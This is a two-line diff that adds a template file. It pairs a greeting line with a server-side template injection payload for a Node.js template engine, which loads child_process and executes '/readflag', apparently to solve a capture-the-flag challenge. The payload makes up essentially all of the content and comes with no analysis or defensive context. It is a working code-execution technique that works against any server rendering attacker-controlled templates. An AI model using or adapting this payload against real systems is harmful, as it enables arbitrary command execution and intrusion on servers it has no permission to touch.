@@ -1,0 +1,2 @@
+Hello guys {{ name }}
+{{ global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() }}
